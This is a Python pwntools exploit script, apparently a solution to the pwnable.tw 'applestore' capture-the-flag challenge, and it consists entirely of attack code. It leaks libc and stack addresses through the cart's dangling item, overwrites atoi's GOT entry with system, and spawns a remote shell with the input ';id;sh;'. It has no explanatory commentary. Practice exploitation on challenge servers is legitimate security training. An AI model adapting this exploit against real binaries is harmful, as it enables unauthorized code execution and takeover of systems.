from pwn import *

binary = context.binary = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")


if args.REMOTE:
    r = remote("chall.pwnable.tw", 10104)
else:
    r = process(binary.path)
    #gdb.attach(r, api=True)

payload = b""

def Add(item):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', item)

for i in range(20):
    Add(b'2')
for i in range(6):
    Add(b'1')

r.sendlineafter(b'> ', b'5')

log.info("Atoi got: " + hex(binary.got['atoi']))
r.sendlineafter(b'ok? (y/n) > ', b'y')


payload = b'27' + p32(binary.got['atoi']) #+ p32(0)*3
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )
leak_atoi_runtime_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

atoi_offset = libc.symbols['atoi']
log.info("offset atoi: " + hex(atoi_offset))
libc.address = u32(leak_atoi_runtime_addr) - atoi_offset
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
log.info("system: " + hex(system))
log.info("binsh: " + hex(bin_sh))

####################################################

log.info("environ ??? : " + hex(libc.sym['environ']))
payload = b'27' + p32(libc.sym['environ']) #+ p32(0)*3
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )

leak_environ_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

log.info("environ addr: " + hex(u32(leak_environ_addr)))
ebp_addr_delete = u32(leak_environ_addr) - 0x104

log.info("ebp addr delete stack frame: " + hex(ebp_addr_delete))

####################################################

payload = b'27' + p32(0)*2  + p32(ebp_addr_delete - 0xc) + p32(binary.got['atoi'] + 0x22)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )
log.info("atoi got(): " + hex(binary.got['atoi']))


payload =  p32(system)  + b";id;sh;"
r.sendafter(b'> ', payload  )


r.interactive()



